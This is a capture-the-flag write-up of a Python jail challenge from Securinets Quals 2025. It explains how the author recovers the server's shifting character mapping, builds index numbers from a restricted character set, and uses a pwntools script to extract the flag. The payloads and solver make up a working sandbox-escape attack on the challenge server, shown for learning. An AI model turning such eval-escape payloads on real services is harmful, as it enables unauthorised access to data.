---
title: "Securinets Quals 2025 – misc/easy-jail: pyjail"
date: 2025-10-4
toc: true
---

Another python jail challenge where you have a specific set of allowed characters and payload length limit and you have to read flag. The program only allows lowercase characters and these `[]()~><*+` special characters.

Contrary to other challenges where the flag is stored in a file here it's stored in a class:

```python
class ProtectedFlag:
    def __init__(self, value):
        self._value = value

    def __str__(self):
        return "variable protected, sryy"

    def __repr__(self):
        return "variable protected, sryy"

    def __getitem__(self, index):
        try:
            return self._value[index]
        except Exception:
            return "variable protected, sryy"

flag = ProtectedFlag("flag{dummy_flag}")
```

We can access the flag via indexing like `flag[0]`, `flag[1]`, ..., `flag[n]`. 

The challenge creates a initial mapping that shifts after each input. It encodes our input by mapping it to the generated mapping.

```python
def make_initial_mapping():
    letters = list(string.ascii_lowercase)
    shuffled = letters[:]
    random.shuffle(shuffled)
    return dict(zip(letters, shuffled))
```

```python3
...SNIP...
    mapping = make_initial_mapping()
    print("Welcome to the shifting jail! Enter text using only a-z, []()~><*+")

    try:
        while True:
            user_in = input("> ").strip()
            if len(user_in) > 150:
                raise ValueError(f"Input exceeds 150 characters")

            if not all(c in valid_chars for c in user_in):
                print("Invalid input. Only [a-z] and []()~><*+ are allowed.")
                continue

            encoded = "".join(mapping[c] if c in mapping else c for c in user_in)

            mapping = shift_mapping(mapping)
            try:
                result = eval(encoded, {"__builtins__": None}, {"flag": flag})
                print(result)
            except Exception:
                print(encoded)

    except KeyboardInterrupt:
        print("\nGoodbye!")
...SNIP...
```

The `shift_mapping` function source code is not provided so, we have to guess how the mapping changes.

```python
def shift_mapping(mapping):
    # well guess how it was done >_<
```

We can find the mapping used and how it changes after each run by sending in "a-z" multiple times because the program evaluates the input after encoding it with the mapping and if it errors out it just prints the encoded input:

```python
            try:
                result = eval(encoded, {"__builtins__": None}, {"flag": flag})
                print(result)
            except Exception:
                print(encoded)
```

By sending it a-z multiple times I found cases where the first mapping was equal to third. 

```
$ nc misc-b6c94dd8.p1.securinets.tn 7000
Welcome to the shifting jail! Enter text using only a-z, []()~><*+
> abcdefghijklmnopqrstuvwxyz
abcdefghijklmnopqrstuvwxyz
quldpmvsfxknawtberzcjgyhio
> abcdefghijklmnopqrstuvwxyz
abcdefghijklmnopqrstuvwxyz
ptkcolurewjmzvsadqybifxghn
> abcdefghijklmnopqrstuvwxyz
abcdefghijklmnopqrstuvwxyz
quldpmvsfxknawtberzcjgyhio
> ^C
```

> One thing to note here is that this doesn't occur in all the cases so multiple tries are required.

So, we could send a-z to get the mapping and then send any input just so it's mapping shifts to the inital mapping and we can send a input when mapped with the initial mapping that we recovered becomes flag.

```
$ nc misc-b6c94dd8.p1.securinets.tn 7000
Welcome to the shifting jail! Enter text using only a-z, []()~><*+
> abcdefghijklmnopqrstuvwxyz
abcdefghijklmnopqrstuvwxyz
ayckhiwqtlnompgzubjfdrsvxe
> abcdefghijklmnopqrstuvwxyz
abcdefghijklmnopqrstuvwxyz
zxbjghvpskmnlofytaiecqruwd
> tjao
tjao
variable protected, sryy
> ^C
```

Now we have to find a way to generate the indexes using only the provided characters. As I have done some previous challenges like this I knew we could use these expressions to make numbers. One such way is to use `~([]<[])=-1` as a unit to build upon:

```
$ python3            
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> []
[]
>>> []<[]            # because []==[]
False
>>> ~([]<[])
-1
>>> 
```

Using this as a unit we can build bigger numbers like this:
```
-2: ~([]<[])+~([]<[])
-1: ~([]<[])
 0: ~(~([]<[]))
 1: ~(~([]<[])+~([]<[]))
 2: ~(~([]<[])+~([]<[])+~([]<[]))
 3: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))
 4: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))
 ...
 n: ~(~([]<[])+~([]<[])*n)	
```

If their wasn't a limit of the characters being less than 150 characters then we could keep adding `~([]<[])` to get the numbers but, unfortunately we don't live in a fairy world.

I tried writing multiple ways to create these payloads while keeping them under 150 characters but, all attempts failed. Although a more skilled `@diksown` wrote a function that could create these payloads:

```
# $ cat symbol_number.py 
class SymbolNumber:
    def __init__(self, value: str):
        self.value = value

    def __add__(self, other: "SymbolNumber") -> "SymbolNumber":
        return SymbolNumber(f"({self.value})+({other.value})")

    def __mul__(self, other: "SymbolNumber") -> "SymbolNumber":
        return SymbolNumber(f"({self.value})*({other.value})")

    def __str__(self) -> str:
        return self.value

    @staticmethod
    def from_number(n: int) -> "SymbolNumber":
        if n == 0:
            return SymbolNumber("[]>[]")
        elif n == 1:
            return SymbolNumber("[[]]>[]")
        elif n == 2:
            return SymbolNumber.from_number(1) + SymbolNumber.from_number(1)
        elif n % 2 == 1:
            return SymbolNumber.from_number(n - 1) + SymbolNumber.from_number(1)
        else:
            return SymbolNumber.from_number(n // 2) * SymbolNumber.from_number(2)


def from_number(n: int) -> str:
    return str(SymbolNumber.from_number(n))

# $ python -i symbol_number.py 
>>> from_number(1)
'[[]]>[]'
>>> from_number(2)
'([[]]>[])+([[]]>[])'
>>> from_number(5)
'((([[]]>[])+([[]]>[]))*(([[]]>[])+([[]]>[])))+([[]]>[])'
>>> from_number(30)
'((((((([[]]>[])+([[]]>[]))+([[]]>[]))*(([[]]>[])+([[]]>[])))+([[]]>[]))*(([[]]>[])+([[]]>[])))+([[]]>[]))*(([[]]>[])+([[]]>[]))'
```

But, during the CTF I resorted to crafting the payloads by hand. As we already know that the flag starts with `Securinets{` we can just start fetching from 11 index until we get `}` which marks the end of the flag.

I wrote the following expressions by hand:

```
11: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))+~([]<[])
12: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))
13: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))+~([]<[])
14: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))
15: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))+~([]<[])
16: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))
17: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))+~([]<[])
18: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))
19: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))+~([]<[])
20: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))
21: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))
22: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))+~([]<[])+~([]<[])
23: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))+~([]<[])
24: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))
25: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))
26: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))+~([]<[])
27: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))
28: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))+~(~([]<[])+~([]<[]))
29: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))+~([]<[])
30: ~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))
```

And wrote a program that first sends `a-z` to get mapping and then just does it again so, the mapping is shifted to initial state. Then we send the `mapped_flag` which when mapped by the server becomes `flag` followed by the payload. It keeps at it until it gets a single character which is part of the flag.


```
from pwn import *
context.log_level = 'critical'

ALPHABET = "abcdefghijklmnopqrstuvwxyz"
PAYLOADS = {
    11: "~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))+~([]<[])",
    12: "~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[]))",
...SNIP...
    30: "~(~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[])+~([]<[]))*~(~([]<[])+~([]<[])+~([]<[])+~([]<[]))"
}

def mapped_flag(mapping, text="flag"):
    enc = {mapping[i]: ALPHABET[i] for i in range(26)}
    return ''.join(enc.get(ch, ch) for ch in text)

flag = "Securinets{"
for key, expr in PAYLOADS.items():
        while True:
                r = remote("misc-b6c94dd8.p1.securinets.tn", 7000)
                r.sendlineafter(b"> ", ALPHABET.encode())
                r.recvline()
                mapping = r.recvline().decode().strip()

                r.sendlineafter(b"> ", ALPHABET.encode())
                r.recvline()
                r.recvline().decode().strip()

                r.sendlineafter(b"> ", f"{mapped_flag(mapping)}[{expr}]".encode())
                r.recvline()
                result = r.recvline().decode().strip()
                if len(result) == 1:  break
                r.close()

        print(f"{key}: {result}")
        flag += result
        if result == "}": break

print(flag)
```

```
$ python3 easy-jail.py 
11: H
12: 0
13: p
14: 3
15: _
16: Y
17: 0
18: u
19: _
20: L
21: 0
22: S
23: T
24: _
25: 1
26: t
27: !
28: }
Securinets{H0p3_Y0u_L0ST_1t!}
```

Also after the competition ended the author released the code for shift_mapping function:

```
def shift_mapping(mapping):
    """Shift the VALUES of the mapping randomly by +1 or -1 in the alphabet."""
    shifted = {}
    shift = shift_rng.choice([-1, 1])

    for k, v in mapping.items():
        shifted[k] = chr(((ord(v) - 97 + shift) % 26) + 97)
    return shifted
```
